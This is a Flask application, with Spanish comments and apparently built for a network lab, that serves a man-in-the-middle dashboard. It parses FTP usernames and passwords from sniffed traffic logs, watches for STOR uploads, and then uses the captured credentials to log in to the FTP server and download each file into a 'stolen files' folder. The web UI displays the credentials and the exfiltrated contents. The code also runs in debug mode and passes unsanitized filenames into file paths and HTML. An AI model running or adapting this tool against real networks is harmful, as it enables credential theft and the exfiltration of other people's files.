import os
import re
import ftplib
from flask import Flask, jsonify, render_template_string, send_file

app = Flask(__name__)

LOG_CREDENCIALES = "capturas_ftp.txt"
LOG_TRAFICO_CRUDO = "contenido_trafico.txt"
CARPETA_ROBADOS = "archivos_robados"

# ⚠️ IMPORTANTE: Pon aquí la IP actual de Ubuntu
IP_SERVIDOR_FTP = "10.204.144.74" 

if not os.path.exists(CARPETA_ROBADOS):
    os.makedirs(CARPETA_ROBADOS)

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Dashboard MITM Avanzado - Panel de Control</title>
    <style>
        :root {
            --bg: #F5F5F5;
            --surface: #E9E9E9;
            --border: #CCCCCC;
            --text: #1f2a2a;
            --muted: #5d6b6b;
            --accent: #006666;
            --accent-strong: #008584;
        }
        * { box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: var(--bg);
            color: var(--text);
            margin: 24px;
        }
        h1 {
            color: var(--accent);
            text-align: center;
            border-bottom: 1px solid var(--border);
            padding-bottom: 12px;
            margin-bottom: 24px;
            font-weight: 600;
            letter-spacing: 0.3px;
        }
        .container {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
            gap: 20px;
            margin-bottom: 20px;
        }
        .panel,
        .panel-full {
            background: var(--surface);
            padding: 18px;
            border-radius: 12px;
            border: 1px solid var(--border);
            box-shadow: 0 6px 18px rgba(0, 0, 0, 0.06);
        }
        .panel { display: flex; flex-direction: column; }
        h2 {
            border-bottom: 1px solid var(--border);
            padding-bottom: 8px;
            color: var(--accent-strong);
            margin-top: 0;
            font-weight: 600;
        }
        pre {
            background: #FFFFFF;
            padding: 12px;
            border-radius: 10px;
            border: 1px solid var(--border);
            overflow-x: auto;
            color: var(--text);
            font-family: 'Courier New', Courier, monospace;
            flex-grow: 1;
            min-height: 200px;
            max-height: 300px;
            overflow-y: auto;
            white-space: pre-wrap;
        }
        .alert {
            background: #FFFFFF;
            color: var(--accent);
            border: 1px solid var(--accent-strong);
            padding: 14px;
            border-radius: 10px;
            text-align: center;
            font-weight: 600;
            margin-bottom: 20px;
            display: none;
            font-size: 1.05em;
            animation: pulse 2s infinite;
        }
        @keyframes pulse { 0% { opacity: 0.75; } 50% { opacity: 1; } 100% { opacity: 0.75; } }
        .btn-download {
            display: inline-block;
            background: var(--accent);
            color: #FFFFFF;
            padding: 10px 16px;
            border: none;
            border-radius: 8px;
            font-weight: 600;
            text-decoration: none;
            cursor: pointer;
            margin-top: 12px;
            text-align: center;
            transition: 0.2s ease-in-out;
        }
        .btn-download:hover { background: var(--accent-strong); }
        .modal {
            display: none;
            position: fixed;
            z-index: 1000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.35);
            backdrop-filter: blur(3px);
        }
        .modal-content {
            background-color: #FFFFFF;
            margin: 12% auto;
            padding: 22px;
            border: 1px solid var(--border);
            width: min(560px, 90%);
            border-radius: 14px;
            text-align: center;
            box-shadow: 0 18px 40px rgba(0, 0, 0, 0.18);
        }
        .modal-h2 { color: var(--accent); margin-top: 0; font-size: 22px; }
        .modal-btn {
            background: var(--accent);
            color: #FFFFFF;
            border: none;
            padding: 10px 20px;
            font-weight: 600;
            border-radius: 8px;
            cursor: pointer;
            margin-top: 15px;
        }
        .modal-btn:hover { background: var(--accent-strong); }
    </style>
</head>
<body>
    <h1>🕵️‍♂️ Panel de Interceptación de Red en Vivo (MITM)</h1>
    <div id="alerta-archivo" class="alert">🚨 ¡SNARE DETECTED: NUEVA TRANSFERENCIA DE ARCHIVO INTERCEPTADA! 🚨</div>
    <div id="modal-notificacion" class="modal">
        <div class="modal-content">
            <h2 class="modal-h2">⚠️ Alerta de Exfiltración ⚠️</h2>
            <p id="modal-mensaje" style="font-size: 1.1em;"></p>
            <button class="modal-btn" onclick="cerrarModal()">Entendido</button>
        </div>
    </div>
    <div class="container">
        <div class="panel">
            <h2>🔑 Credenciales Capturadas (ngrep)</h2>
            <pre id="logs-credenciales">Esperando intentos de inicio de sesión...</pre>
        </div>
        <div class="panel">
            <h2>📂 Contenido del Archivo Exfiltrado</h2>
            <div id="meta-archivo" style="color: #006666; font-weight: 600; margin-bottom: 6px;">Ningún archivo capturado aún.</div>
            <pre id="contenido-archivo">Esperando comando STOR / transferencia de datos...</pre>
            <a id="link-descarga" href="#" class="btn-download" style="display: none;">📥 Descargar Archivo Original Intacto</a>
        </div>
    </div>
    <div class="panel-full">
        <h2>🌐 Tráfico Completo de Red en Tiempo Real (contenido_trafico.txt)</h2>
        <pre id="logs-crudos" style="max-height: 400px;">Monitoreando puertos de red...</pre>
    </div>
    <script>
        let ultimoArchivoCapturado = "";
        async function actualizarDashboard() {
            try {
                const res = await fetch('/api/data');
                const data = await res.json();
                
                if(data.credenciales.trim().length > 0) {
                    document.getElementById('logs-credenciales').innerText = data.credenciales;
                }
                const crudosDiv = document.getElementById('logs-crudos');
                if(data.trafico_crudo.trim().length > 0) {
                    crudosDiv.innerText = data.trafico_crudo;
                    crudosDiv.scrollTop = crudosDiv.scrollHeight;
                }
                
                if (data.archivo_detectado) {
                    document.getElementById('alerta-archivo').style.display = 'block';
                    document.getElementById('meta-archivo').innerText = `Archivo detectado: ${data.nombre_archivo}`;
                    document.getElementById('contenido-archivo').innerText = data.contenido_archivo;
                    const downloadBtn = document.getElementById('link-descarga');
                    downloadBtn.href = `/api/download/${data.nombre_archivo}`;
                    downloadBtn.style.display = 'block';

                    if (data.nombre_archivo !== ultimoArchivoCapturado) {
                        ultimoArchivoCapturado = data.nombre_archivo;
                        mostrarModal(`Se ha interceptado una carga útil en la red local. Nombre del archivo exfiltrado: <b>${data.nombre_archivo}</b>`);
                    }
                } else {
                    document.getElementById('alerta-archivo').style.display = 'none';
                    document.getElementById('link-descarga').style.display = 'none';
                }
            } catch (err) {}
        }
        function mostrarModal(mensaje) {
            document.getElementById('modal-mensaje').innerHTML = mensaje;
            document.getElementById('modal-notificacion').style.display = 'block';
        }
        function cerrarModal() {
            document.getElementById('modal-notificacion').style.display = 'none';
        }
        setInterval(actualizarDashboard, 2000);
    </script>
</body>
</html>
"""

def obtener_credenciales():
    usuario, password = None, None
    if os.path.exists(LOG_CREDENCIALES):
        with open(LOG_CREDENCIALES, "r", errors='ignore') as f:
            for linea in f:
                if "USER " in linea:
                    usuario = linea.split("USER ")[1].strip().rstrip('.')
                elif "PASS " in linea:
                    password = linea.split("PASS ")[1].strip().rstrip('.')
    return usuario, password

def exfiltrar_archivo_via_ftp(usuario, password, nombre_archivo):
    ruta_local = os.path.join(CARPETA_ROBADOS, nombre_archivo)
    if os.path.exists(ruta_local): return True 
    if not usuario or not password: return False

    try:
        ftp = ftplib.FTP(IP_SERVIDOR_FTP)
        ftp.login(usuario, password)
        with open(ruta_local, 'wb') as f:
            ftp.retrbinary(f'RETR {nombre_archivo}', f.write)
        ftp.quit()
        return True
    except Exception as e:
        return False

@app.route('/')
def home(): return render_template_string(HTML_TEMPLATE)

@app.route('/api/data')
def get_data():
    credenciales_texto = ""
    usuario, password = obtener_credenciales()
    if os.path.exists(LOG_CREDENCIALES):
        with open(LOG_CREDENCIALES, "r", errors='ignore') as f:
            filtradas = [l for l in f.readlines() if "USER" in l or "PASS" in l]
            credenciales_texto = "".join(filtradas[-12:])

    trafico_crudo = ""
    contenido_tcpdump = ""
    if os.path.exists(LOG_TRAFICO_CRUDO):
        with open(LOG_TRAFICO_CRUDO, "r", errors='ignore') as f:
            contenido_tcpdump = f.read()
            trafico_crudo = "\n".join(contenido_tcpdump.splitlines()[-40:])

    archivo_detectado, nombre_archivo, contenido_archivo = False, "", ""
    matches = re.findall(r"STOR\s+([^\s\r\n]+)", contenido_tcpdump)
    
    if matches:
        nombre_archivo = matches[-1]
        archivo_detectado = True
        exfiltrar_archivo_via_ftp(usuario, password, nombre_archivo)
        ruta_robada = os.path.join(CARPETA_ROBADOS, nombre_archivo)
        
        if os.path.exists(ruta_robada):
            try:
                with open(ruta_robada, 'r', encoding='utf-8') as f:
                    contenido_archivo = f.read()[:1500] 
            except UnicodeDecodeError:
                contenido_archivo = "📄 [ARCHIVO BINARIO O PDF DETECTADO]\n\nEl archivo ha sido interceptado intacto. Utiliza el botón de abajo para descargarlo."

    return jsonify({"credenciales": credenciales_texto, "trafico_crudo": trafico_crudo, "archivo_detectado": archivo_detectado, "nombre_archivo": nombre_archivo, "contenido_archivo": contenido_archivo})

@app.route('/api/download/<filename>')
def download_file(filename):
    ruta_archivo = os.path.join(CARPETA_ROBADOS, filename)
    if os.path.exists(ruta_archivo): return send_file(ruta_archivo, as_attachment=True)
    return "Archivo no disponible", 404

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)